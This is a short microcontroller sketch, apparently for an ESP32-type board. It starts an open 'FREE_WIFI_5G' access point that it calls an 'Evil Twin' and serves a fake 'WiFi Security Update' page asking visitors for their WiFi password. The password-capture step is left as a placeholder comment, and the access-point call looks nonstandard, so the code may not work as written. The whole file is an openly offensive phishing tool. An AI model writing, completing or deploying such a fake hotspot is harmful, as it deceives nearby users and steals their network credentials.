#include <WiFi.h>
#include <WiFiServer.h>

const char* ssid = "FREE_WIFI_5G"; // Fake Hotspot Name
WiFiServer server(80);

// Fake Login Page HTML
String loginPage = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1.0'>"
                   "<style>body{font-family:sans-serif;text-align:center;padding-top:50px;}"
                   "input{padding:10px;width:80%;margin:10px; border:1px solid #ccc; border-radius:5px;}"
                   "button{padding:10px 20px;background:#007bff;color:white;border:none;border-radius:5px;}</style></head>"
                   "<body><h1>WiFi Security Update</h1><p>Please login to continue</p>"
                   "<form action='/login'><input type='password' name='pass' placeholder='WiFi Password' required><br>"
                   "<button type='submit'>Connect</button></form></body></html>";

void setup() {
  Serial.begin(115200);
  
  // Start 5GHz AP on Channel 36
  Serial.println("Starting 5GHz Evil Twin...");
  WiFi.ap(ssid, "", 36); 
  
  server.begin();
  Serial.println("Evil Twin Active!");
}

void loop() {
  WiFiClient client = server.available();
  if (client) {
    String request = client.readStringUntil('\r');
    if (request.indexOf("/login") != -1) {
      // Yahan password capture logic aayega
      Serial.println("Password Attempt Received!");
    }
    client.println("HTTP/1.1 200 OK");
    client.println("Content-Type: text/html");
    client.println("");
    client.println(loginPage);
    client.stop();
  }
}
